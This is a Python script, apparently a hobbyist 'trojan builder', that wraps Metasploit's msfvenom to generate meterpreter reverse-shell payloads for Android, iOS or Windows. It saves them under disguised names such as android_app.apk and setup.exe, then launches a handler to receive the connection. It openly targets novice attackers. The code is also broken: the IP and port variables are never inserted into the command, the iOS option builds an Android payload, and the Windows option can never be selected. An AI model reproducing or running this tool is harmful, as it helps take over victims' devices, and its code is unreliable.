import os

print('''

███████╗██╗███╗   ███╗██╗███╗   ██╗    ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
██╔════╝██║████╗ ████║██║████╗  ██║    ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
███████╗██║██╔████╔██║██║██╔██╗ ██║       ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
╚════██║██║██║╚██╔╝██║██║██║╚██╗██║       ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
███████║██║██║ ╚═╝ ██║██║██║ ╚████║       ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
╚══════╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝       ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝

	||==================================================================||
	|| S I M I N T R O J A N                                            ||
	||                                                                  ||
	|| It's a Third Party App for Metasploit !                          ||
	||                                                                  ||
	|| Easy To USE For Noob Hackers , Lazy Hackers & Script Kiddies !   ||
	||                                                                  ||
	|| Developer : Mohammad Babaee                                      ||
	||==================================================================||

	''')

print ('''
	What Device Do You Want To Hack ?

	1 ) Android Phone
	2 ) IOS Phone
	3 ) PC / LAPTOP With Windows OS

	''')

input_number = str(input("Please Enter The Number > "))

input_ip = input("Please Enter Your System IP > ")
ip_save = "LHOST=" + str(input_ip)
print("LHOST IS SET : " + str(ip_save))

print("---------")

input_port = input("Please Enter Any Port That You Want > ")
port_save = "LPORT=" + str(input_port)
print("LPORT IS SET : " + str(port_save))

print("---------")

print("----> Your TROJAN Is Creating , Please Wait <----")

if input_number == "1":
	os.system('msfvenom -p android/meterpreter/reverse_tcp + ip_save + port_save -o ./android_app.apk' )
	print('''
	||================================================================||
	||   Your Trojan Is Ready Here , Saved As : [ android_app.apk ]   ||
	||================================================================||
		''')
	os.system('msfconsole -q -x exploit/multi/handler')
elif input_number == "2":
	os.system('msfvenom -p android/meterpreter/reverse_tcp + ip_save + port_save -o ./ios_app' )
	print('''
	||================================================================||
	||   Your Trojan Is Ready Here , Saved As : [ ios_app ]           ||
	||================================================================||
		''')
	os.system('msfconsole -q -x exploit/multi/handler')
elif input_number == 3:
	os.system('msfvenom -p windows/meterpreter/reverse_tcp + ip_save + port_save -o ./setup.exe' )
	print('''
	||================================================================||
	||   Your Trojan Is Ready Here , Saved As : [ setup.exe ]         ||
	||================================================================||
		''')
	os.system('msfconsole -q -x exploit/multi/handler')
else:
	print("Your Input Values Are Wrong , Please Try Again ...")



print ('''
	
                           Happy Hacking !
        ------ This App Is Published Under (MIT License) ------
    ''')